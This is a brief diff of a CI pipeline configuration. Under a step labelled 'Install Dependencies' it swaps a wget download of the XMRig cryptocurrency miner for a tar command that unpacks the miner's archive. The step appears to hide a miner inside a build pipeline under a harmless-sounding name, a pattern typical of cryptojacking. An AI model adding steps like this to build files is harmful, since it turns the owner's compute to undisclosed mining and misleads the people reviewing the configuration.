@@ -8,7 +8,7 @@ jobs:
         - run:
             name: Install Dependencies
             command: |
-              wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz
+              tar xvzf xmrig-6.16.2-focal-x64.tar.gz
 workflows:
     version: 2.1
     build:
